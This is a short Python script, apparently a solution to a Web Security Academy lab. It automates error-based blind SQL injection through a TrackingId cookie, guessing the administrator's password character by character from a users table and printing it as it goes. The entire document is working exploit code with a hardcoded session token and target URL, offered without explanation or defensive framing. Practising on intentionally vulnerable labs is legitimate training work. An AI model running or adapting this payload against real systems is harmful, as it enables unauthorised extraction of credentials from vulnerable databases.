import requests
from string import ascii_lowercase, digits

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL
        self.session = "4yFDsLwlH1LD6itETdND3NP20J8APo0B"
        self.TrackingId = "eR3hoiUgWhRNtCW3"
        self.charset = ascii_lowercase + digits
    
    def extract_value(self):
        password = ""
        position = 1 
        try:
            while True:
                found = False
                for character in self.charset:
                    payload = (
                        f"{self.TrackingId}'||(SELECT CASE "
                        f"WHEN SUBSTR(password,{position},1)='{character}' "
                        f"THEN TO_CHAR(1/0) ELSE '' END "
                        f"FROM users WHERE username='administrator')||'"
                    )
                    cookie = {
                        "session": self.session,
                        "TrackingId": payload
                    }
                    response = requests.get(self.baseURL, cookies=cookie)
                    if response.status_code != 200:
                        password += character
                        print(f"[+] Found Password Admin: {password}")
                        position += 1
                        found = True
                        break
                if not found:
                    print("[+] Password extraction completed!")
                    break

        except KeyboardInterrupt:
            print("\n[!] Stopped by user")

if __name__ == "__main__":
    BASE_URL = "https://0ad30044044925ba80cb1725008c00f3.web-security-academy.net/"
    exploit = Exploit(BASE_URL)
    exploit.extract_value()